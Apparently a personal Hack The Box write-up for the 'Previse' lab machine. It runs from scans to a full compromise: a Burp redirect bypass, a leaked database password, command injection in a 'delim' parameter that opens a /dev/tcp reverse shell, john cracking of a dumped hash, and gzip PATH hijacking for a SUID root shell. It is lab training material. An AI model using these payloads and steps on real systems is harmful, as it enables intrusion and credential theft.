Previse IP:10.10.11.104

rustscan:
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack



nmap:


PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U+bBa/UyMNxMjkPO+rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB+KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q+i+gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI+k9kT2gYslacuTwQhacntIh2XFo0YtfY+dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF+aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=
|   256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv+Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

gobuster dir -u http://previse.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -x txt,php,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://previse.htb
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,txt,php
[+] Timeout:        10s
===============================================================
2023/02/15 08:40:06 Starting gobuster
===============================================================
/download.php (Status: 302)
/index.php (Status: 302)
/login.php (Status: 200)
/files.php (Status: 302)
/header.php (Status: 200)
/nav.php (Status: 200)
/footer.php (Status: 200)
/css (Status: 301)
/status.php (Status: 302)
/js (Status: 301)
/logout.php (Status: 302)
/accounts.php (Status: 302)
/config.php (Status: 200)
/logs.php (Status: 302)
/server-status (Status: 403)
===============================================================
2023/02/15 08:53:03 Finished
===============================================================



                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Practice/HackTheBox/Previse]
└─$ nikto -h http://previse.htb            
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.104
+ Target Hostname:    previse.htb
+ Target Port:        80
+ Start Time:         2023-02-15 08:14:56 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ Root page / redirects to: login.php
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7785 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2023-02-15 08:23:25 (GMT-5) (509 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested



the site on port 80 keeps redirecting to /login.php. We can bypass it by using burp and nagivate to root page:

Skipping Redirects
By default, Burp intercept only stops requests, not responses. To see the root page, I’ll turn on Server Response Interception in Burp Proxy, and then turn Intercept On:

This way we reach a page  that contains the follwoing: home, accounts.files. management, logout

if we click on accounts, we can create a new account. after that we can disable burp suite 

now that we are logged in, we go to files and then we download sitebackups.zip

we then read the config.php

cat config.php                                                                           
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}
visiting /file_logs.php we can download a new file, and check the last log ins:

time,user,fileID
1622482496,m4lwhere,4
1622485614,m4lwhere,4
1622486215,m4lwhere,4
1622486218,m4lwhere,1
1622486221,m4lwhere,1
1622678056,m4lwhere,5
1622678059,m4lwhere,6
1622679247,m4lwhere,1
1622680894,m4lwhere,5
1622708567,m4lwhere,4
1622708573,m4lwhere,4
1622708579,m4lwhere,5
1622710159,m4lwhere,4
1622712633,m4lwhere,4
1622715674,m4lwhere,24
1622715842,m4lwhere,23
1623197471,m4lwhere,25
1623200269,m4lwhere,25
1623236411,m4lwhere,23
1623236571,m4lwhere,26
1623238675,m4lwhere,23
1623238684,m4lwhere,23
1623978778,m4lwhere,32
1676469181,vanya,32


foothold:

we capture the request and edit the delim parameter:

POST /logs.php HTTP/1.1
Host: previse.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: http://previse.htb
Connection: close
Referer: http://previse.htb/file_logs.php
Cookie: PHPSESSID=ftu02j7gncgh7psu0tude4rrcc
Upgrade-Insecure-Requests: 1

delim=%3bbash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.6/4444+0>%261'%3b



start a nc listener on 4444

                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Practice/HackTheBox/Previse]
└─$ nc -lnvp 4444               
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.104] 55120
bash: cannot set terminal process group (1436): Inappropriate ioctl for device
bash: no job control in this shell
www-data@previse:/var/www/html$ 


user flag:

www-data@previse:/home/m4lwhere$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

we need to move laterally, lets try to see if we have passwords stored in the db

www-data@previse:/home/m4lwhere$ mysql -u root -p'mySQL_p@ssw0rd!:)' -e 'show databases';
< -u root -p'mySQL_p@ssw0rd!:)' -e 'show databases';
mysql: [Warning] Using a password on the command line interface can be insecure.
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+

www-data@previse:/home/m4lwhere$ mysql -u root -p'mySQL_p@ssw0rd!:)' previse -e 'show tables';
<oot -p'mySQL_p@ssw0rd!:)' previse -e 'show tables';
mysql: [Warning] Using a password on the command line interface can be insecure.
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+


www-data@previse:/home/m4lwhere$ mysql -u root -p'mySQL_p@ssw0rd!:)' previse -e 'SELECT * FROM accounts';
<L_p@ssw0rd!:)' previse -e 'SELECT * FROM accounts';
mysql: [Warning] Using a password on the command line interface can be insecure.
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | vanya    | $1$🧂llol$zVSoVfqdnFthQywvzGpB2. | 2023-02-15 13:51:57 |
+----+----------+------------------------------------+---------------------+


we can use john to crack the hash:

┌──(kali㉿kali)-[~/Practice/HackTheBox/Previse]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:35 DONE (2023-02-15 09:16) 0g/s 395180p/s 395180c/s 395180C/s !!!0mc3t..*7¡Vamos!
Session completed. 
                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Practice/HackTheBox/Previse]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovecody112235! (?)     
1g 0:00:03:59 DONE (2023-02-15 09:21) 0.004172g/s 30931p/s 30931c/s 30931C/s ilovecodydean..ilovecody..
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


we can check to see if we can log on to ssh using this passwd:


┌──(kali㉿kali)-[~/Practice/HackTheBox/Previse]
└─$ ssh m4lwhere@10.10.11.104
m4lwhere@10.10.11.104's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Feb 15 14:35:31 UTC 2023

  System load:  0.0               Processes:           179
  Usage of /:   53.2% of 4.85GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.11.104
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5
m4lwhere@previse:~$ 


yes, we can

Vulnerable to CVE-2021-4034 

m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh 
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
m4lwhere@previse:~$ 



PrivESC:

m4lwhere@previse:~$ cd /tmp
m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
m4lwhere@previse:/tmp$ echo -ne '#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash' > gzip
m4lwhere@previse:/tmp$ chmod +x gzip
m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh
m4lwhere@previse:/tmp$ ls -la /tmp/bash
-rwsr-xr-x 1 root root 1113504 Feb 15 14:52 /tmp/bash
m4lwhere@previse:/tmp$ /tmp/bash -p
bash-4.4# id
uid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root) groups=1000(m4lwhere)
bash-4.4# cat /root/root.txt
827d38ee61d790d88a9a37a95d3a42a0
bash-4.4# cat /home/m4lwhere/user.txt 
9f4b211bbc4b20bbb21bdf31e2148677
bash-4.4# 

